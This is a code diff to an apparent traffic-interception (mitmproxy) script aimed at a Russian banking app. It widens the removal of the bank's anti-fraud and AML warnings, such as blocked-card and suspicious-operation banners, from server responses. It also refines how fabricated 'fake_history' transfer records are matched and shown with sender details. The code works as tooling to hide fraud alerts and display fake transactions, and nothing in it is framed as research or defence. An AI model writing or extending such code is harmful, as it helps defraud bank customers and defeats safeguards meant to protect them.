@@ -282,12 +282,12 @@ _FRAUD_BANNER_MARKERS = (
     "заблокировали карту",
     "временно заблокировали карту",
     "карту временно заблокировали",
+    "временно заблокировали",
     "блокировку карты",
     "подозрительные операции",
     "подозрительная операция",
     "подозрительную операцию",
     "подозрительная активность",
-    "временно заблокировали",
     "давайте проверим",
     "проверим ее в чате",
     "проверим её в чате",
@@ -362,6 +362,13 @@ def neutralize_security_banner_strings(obj) -> bool:
                         node.pop(i)
                         changed = True
                         continue
+                    blob_join = " ".join(
+                        str(vv) for vv in x.values() if isinstance(vv, str)
+                    )[:1200]
+                    if len(blob_join) >= 16 and _string_matches_fraud_banner(blob_join):
+                        node.pop(i)
+                        changed = True
+                        continue
                 walk(x, depth + 1)
                 i += 1
 
@@ -401,6 +408,44 @@ def neutralize_aml_ui_flags(obj) -> bool:
                     walk(x)
 
     walk(obj)
+    return changed
+
+
+def neutralize_compound_security_strings(obj) -> bool:
+    """Фразы AML из склеенных полей / длинных текстов (обход узкого списка маркеров)."""
+
+    def _bad(text: str) -> bool:
+        low = text.lower()
+        if len(low) < 22:
+            return False
+        if "заблок" in low and ("карт" in low or "перевод" in low or "операц" in low):
+            return True
+        if "подозрительн" in low and ("операц" in low or "платеж" in low or "перевод" in low):
+            return True
+        if "антимошеннич" in low or "антимошенник" in low:
+            return True
+        if "ограничил" in low and "операц" in low:
+            return True
+        return False
+
+    changed = False
+
+    def walk(node, depth: int = 0) -> None:
+        nonlocal changed
+        if depth > 52:
+            return
+        if isinstance(node, dict):
+            for k, v in list(node.items()):
+                if isinstance(v, str) and _bad(v):
+                    node[k] = ""
+                    changed = True
+                else:
+                    walk(v, depth + 1)
+        elif isinstance(node, list):
+            for x in node:
+                walk(x, depth + 1)
+
+    walk(obj, 0)
     return changed
 
 
@@ -2526,9 +2571,19 @@ def _fake_transfer_ops_for_panel_month(skip_ids: set) -> list:
     return _fake_transfer_ops_for_panel(skip_ids, month_only=True)
 
 
+def canonical_fake_transfer_op_id(op_id: str) -> str:
+    """Клиент шлёт paymentid=unified_…; в JSON — UNIFIED_… — сопоставляем с last_transfer."""
+    s = str(op_id or "").strip()
+    m = re.match(r"(?i)^unified_(.+)$", s)
+    if m:
+        return "UNIFIED_" + m.group(1)
+    return s
+
+
 def op_id_in_fake_history_files(op_id: str) -> bool:
     if not op_id:
         return False
+    cid = canonical_fake_transfer_op_id(op_id)
     for path in _last_transfer_json_paths():
         if not os.path.isfile(path):
             continue
@@ -2538,7 +2593,7 @@ def op_id_in_fake_history_files(op_id: str) -> bool:
         except Exception:
             continue
         for op in data.get("fake_history") or []:
-            if isinstance(op, dict) and str(op.get("id") or "") == str(op_id):
+            if isinstance(op, dict) and canonical_fake_transfer_op_id(str(op.get("id") or "")) == cid:
                 return True
     return False
 
@@ -2547,6 +2602,7 @@ def _fake_history_record_by_id(op_id: str) -> Optional[dict]:
     """Первая запись fake_history с данным id (для слияния с operations_cache в панели)."""
     if not op_id:
         return None
+    cid = canonical_fake_transfer_op_id(op_id)
     for path in _last_transfer_json_paths():
         if not os.path.isfile(path):
             continue
@@ -2556,7 +2612,7 @@ def _fake_history_record_by_id(op_id: str) -> Optional[dict]:
         except Exception:
             continue
         for op in data.get("fake_history") or []:
-            if isinstance(op, dict) and str(op.get("id") or "") == str(op_id):
+            if isinstance(op, dict) and canonical_fake_transfer_op_id(str(op.get("id") or "")) == cid:
                 return op
     return None
 
@@ -2654,6 +2710,7 @@ def fake_history_record_as_manual_dict(hop: dict) -> dict:
     user_desc = str(hop.get("description") or "").strip()
     card_mask = str(hop.get("receiver_card") or hop.get("card_number") or "").strip()
     date_s = str(hop.get("date_full") or "").strip()
+    sender_client = str(hop.get("sender_name") or hop.get("senderDetails") or "").strip()
     sender_rn = str(hop.get("receiver_name") or "").strip()
     out = {
         "id": oid,
@@ -2665,8 +2722,8 @@ def fake_history_record_as_manual_dict(hop: dict) -> dict:
         "phone": phone,
         "requisite_phone": phone,
         "receiver_phone": phone,
-        "requisite_sender_name": sender_rn or title,
-        "sender_name": str(hop.get("sender_name") or "").strip() or sender_rn,
+        "requisite_sender_name": sender_client or sender_rn or title,
+        "sender_name": sender_client or sender_rn,
         "bank": bank,
         "card_number": card_mask,
         "date": date_s,
@@ -3879,6 +3936,8 @@ def response(flow: http.HTTPFlow) -> None:
             if neutralize_security_banner_strings(data):
                 security_patched = True
             if neutralize_aml_ui_flags(data):
+                security_patched = True
+            if neutralize_compound_security_strings(data):
                 security_patched = True
 
         if not ctx_stmt:
